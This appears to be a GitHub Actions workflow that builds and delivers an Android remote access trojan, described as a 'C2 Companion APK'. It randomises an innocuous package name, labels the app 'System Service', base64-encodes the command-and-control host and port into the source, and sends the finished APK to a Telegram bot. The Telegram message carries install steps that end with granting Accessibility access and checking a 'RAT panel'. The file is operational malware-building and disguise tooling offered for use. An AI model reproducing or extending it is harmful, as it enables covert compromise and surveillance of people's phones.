# ═══════════════════════════════════════════════════════════════
# C2 Companion APK — Build & Connection Test
#
# Fix applied (Run #1 error):
#   - Upgraded AGP 7.0.4 → 8.1.4 (compatible with Gradle 8.2)
#   - Fixed compileSdk syntax (compileSdkVersion → compileSdk)
#   - Added namespace to app/build.gradle (required by AGP 8.x)
#   - Removed package from AndroidManifest (now in build.gradle)
#   - Fixed sed patch for new build.gradle format
#
# Required GitHub Secrets:
#   TELEGRAM_BOT_TOKEN
#   TELEGRAM_CHAT_ID
# ═══════════════════════════════════════════════════════════════

name: C2 Connection Test Build

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      package_name:
        description: 'Custom package name (blank = random 19 chars)'
        required: false
        default: ''
      app_label:
        description: 'App label shown on device'
        required: false
        default: 'System Service'
      c2_host:
        description: 'C2 Host override (blank = use default in love.java)'
        required: false
        default: ''
      c2_port:
        description: 'C2 Port override (blank = use default in love.java)'
        required: false
        default: ''

jobs:

  build:
    name: Build C2 Companion APK
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:

      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      # ── Generate package name ─────────────────────────────────
      - name: Generate package name
        id: pkg
        run: |
          INPUT_PKG="${{ github.event.inputs.package_name }}"

          if [ -n "$INPUT_PKG" ]; then
            PKG="$INPUT_PKG"
          else
            # Random 19-char: com.phone.helpXXXXX
            SUFFIX=$(cat /dev/urandom | tr -dc 'abcdefghijklmnopqrstuvwxyz' | head -c 5)
            PKG="com.phone.help${SUFFIX}"
          fi

          echo "Package : $PKG (${#PKG} chars)"
          echo "PACKAGE_NAME=$PKG" >> $GITHUB_ENV

      # ── Patch applicationId ───────────────────────────────────
      # AGP 8.x uses: applicationId "xxx" inside defaultConfig block
      - name: Patch applicationId in build.gradle
        run: |
          PKG="${{ env.PACKAGE_NAME }}"

          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$PKG\"|g" \
            app/build.gradle

          # Verify
          echo "Patched:"
          grep "applicationId" app/build.gradle
          echo "[OK] applicationId → $PKG"

      # namespace is intentionally NOT patched
      # namespace = com.android.pictach (Java package of classes - must stay fixed)
      # applicationId = com.phone.helpXXXXX (install identity - patched per build)

      # ── Patch app label ───────────────────────────────────────
      - name: Patch app label in strings.xml
        run: |
          LABEL="${{ github.event.inputs.app_label }}"
          if [ -z "$LABEL" ]; then LABEL="System Service"; fi

          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">$LABEL</string>|g" \
            app/src/main/res/values/strings.xml

          echo "[OK] App label: $LABEL"

      # ── Patch C2 host/port if provided ────────────────────────
      - name: Patch C2 host and port
        run: |
          HOST="${{ github.event.inputs.c2_host }}"
          PORT="${{ github.event.inputs.c2_port }}"

          if [ -n "$HOST" ] && [ -n "$PORT" ]; then
            HOST_B64=$(echo -n "$HOST" | base64 | tr -d '=')
            PORT_B64=$(echo -n "$PORT" | base64 | tr -d '=')

            sed -i "s|Host = \"[^\"]*\"|Host = \"$HOST_B64\"|g" \
              app/src/main/java/com/android/pictach/love.java
            sed -i "s|Port = \"[^\"]*\"|Port = \"$PORT_B64\"|g" \
              app/src/main/java/com/android/pictach/love.java

            echo "[OK] C2 patched → $HOST:$PORT"
          else
            # Decode and show current C2 target
            python3 -c "
          import base64, re
          src = open('app/src/main/java/com/android/pictach/love.java').read()
          h = re.search(r'Host = \"([^\"]+)\"', src)
          p = re.search(r'Port = \"([^\"]+)\"', src)
          if h:
              pad = 4 - len(h.group(1)) % 4
              try: host = base64.b64decode(h.group(1) + ('=' * (pad % 4))).decode()
              except: host = h.group(1)
              print(f'  C2 Host: {host}')
          if p:
              pad = 4 - len(p.group(1)) % 4
              try: port = base64.b64decode(p.group(1) + ('=' * (pad % 4))).decode()
              except: port = p.group(1)
              print(f'  C2 Port: {port}')
            "
            echo "[INFO] Using default C2 from love.java"
          fi

      # ── Grant gradlew permission ──────────────────────────────
      - name: Grant gradlew execute permission
        run: chmod +x gradlew

      # ── Build APK ─────────────────────────────────────────────
      - name: Build Debug APK
        run: |
          ./gradlew assembleDebug \
            --no-daemon \
            --stacktrace \
            2>&1 | tee build_output.log

          if grep -q "BUILD SUCCESSFUL" build_output.log; then
            echo "BUILD_STATUS=success" >> $GITHUB_ENV
            APK=$(find app/build/outputs/apk/debug -name "*.apk" | head -1)
            echo "APK_PATH=$APK" >> $GITHUB_ENV
            echo "APK_SIZE=$(du -h $APK | cut -f1)" >> $GITHUB_ENV
            echo "[OK] Build successful"
          else
            echo "BUILD_STATUS=failed" >> $GITHUB_ENV
            echo "[X] Build FAILED"
          fi

      # ── Upload APK artifact ───────────────────────────────────
      - name: Upload APK artifact
        if: env.BUILD_STATUS == 'success'
        uses: actions/upload-artifact@v4
        with:
          name: C2-APK-${{ env.PACKAGE_NAME }}-run${{ github.run_number }}
          path: ${{ env.APK_PATH }}
          retention-days: 7

      # ── Send APK to Telegram ──────────────────────────────────
      - name: Send APK to Telegram
        if: env.BUILD_STATUS == 'success'
        run: |
          APK="${{ env.APK_PATH }}"
          PKG="${{ env.PACKAGE_NAME }}"
          SIZE="${{ env.APK_SIZE }}"
          RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
          TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M UTC')

          C2_INFO=$(python3 -c "
          import base64, re
          src = open('app/src/main/java/com/android/pictach/love.java').read()
          h = re.search(r'Host = \"([^\"]+)\"', src)
          p = re.search(r'Port = \"([^\"]+)\"', src)
          host,port = 'unknown','unknown'
          if h:
              pad = 4 - len(h.group(1)) % 4
              try: host = base64.b64decode(h.group(1) + ('=' * (pad % 4))).decode()
              except: host = h.group(1)
          if p:
              pad = 4 - len(p.group(1)) % 4
              try: port = base64.b64decode(p.group(1) + ('=' * (pad % 4))).decode()
              except: port = p.group(1)
          print(f'{host}:{port}')
          " 2>/dev/null || echo "see love.java")

          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -F document=@"$APK" \
            -F parse_mode="Markdown" \
            -F caption="✅ *C2 Companion — Build #${{ github.run_number }}*

          📦 Package : \`$PKG\`
          📡 C2      : \`$C2_INFO\`
          📏 Size    : $SIZE
          📅 Built   : $TIMESTAMP

          🔗 [GitHub Actions]($RUN_URL)

          *Install steps:*
          1️⃣ Enable Install unknown apps
          2️⃣ Install this APK
          3️⃣ Open app → allow Accessibility
          4️⃣ Check RAT panel for connection"

          echo "[OK] APK sent to Telegram"

      # ── Collect error log on failure ──────────────────────────
      - name: Collect error log
        if: env.BUILD_STATUS == 'failed' || failure()
        run: |
          LOG="error_log_${{ github.run_number }}.txt"
          {
            echo "========================================"
            echo "C2 BUILD ERROR LOG"
            echo "Run     : #${{ github.run_number }}"
            echo "Package : ${{ env.PACKAGE_NAME }}"
            echo "Time    : $(date -u)"
            echo "========================================"
            echo ""
            echo "--- KEY ERRORS ---"
            grep -E "error:|Error:|FAILED|Exception|Caused by:|cannot find" \
              build_output.log 2>/dev/null | head -50
            echo ""
            echo "--- FULL GRADLE LOG ---"
            cat build_output.log 2>/dev/null
          } > $LOG
          echo "LOG_FILE=$LOG" >> $GITHUB_ENV
          echo "[OK] Error log: $(wc -l < $LOG) lines"

      - name: Upload error log artifact
        if: env.BUILD_STATUS == 'failed' || failure()
        uses: actions/upload-artifact@v4
        with:
          name: error-log-run${{ github.run_number }}
          path: error_log_${{ github.run_number }}.txt
          retention-days: 30

      - name: Send error to Telegram
        if: env.BUILD_STATUS == 'failed' || failure()
        run: |
          LOG="${{ env.LOG_FILE }}"
          RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"

          ERRORS=$(grep -E "error:|FAILED|Exception|Caused by:|cannot find" \
            build_output.log 2>/dev/null | head -15 | head -c 2500)

          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -d parse_mode="Markdown" \
            -d text="❌ *Build Failed — #${{ github.run_number }}*

          📦 \`${{ env.PACKAGE_NAME }}\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')

          \`\`\`
          ${ERRORS}
          \`\`\`

          🔗 [View full log]($RUN_URL)"

          if [ -f "$LOG" ] && [ $(wc -c < "$LOG") -lt 50000000 ]; then
            curl -s -X POST \
              "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
              -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
              -F document=@"$LOG" \
              -F caption="📋 Full error log — Run #${{ github.run_number }}"
          fi
